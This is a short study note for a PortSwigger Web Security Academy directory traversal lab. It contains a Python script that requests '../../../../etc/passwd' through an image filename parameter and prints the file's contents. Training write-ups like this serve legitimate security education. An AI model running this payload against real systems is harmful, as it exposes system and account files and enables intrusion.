<cite> Rana Khalil </cite>

#directorytraversal [[Directory Traversal]]
[Lab](https://portswigger.net/web-security/file-path-traversal/lab-simple)
[Python script](https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/directory-traversal/lab-01/directory-traversal-lab-01.py)
[github](https://github.com/rkhal101/Web-Security-Academy-Series/tree/main/directory-traversal)

*This is the python code to Automate* 
```python code
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def directory_traversal_exploit(url):
    image_url = url +'/image?filename=../../../../etc/passwd'
    r = requests.get(image_url, verify=False, proxies=proxies)
    if 'root:x' in r.text:
        print('(+) Exploit successful!')
        print('(+) The following is the content of the /etc/passwd file:')
        print(r.text)
    else:
        print('(-) Exploit failed.')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) Exploiting the directory traversal vulnerability...")
    directory_traversal_exploit(url)

if __name__ == "__main__":
    main()
```


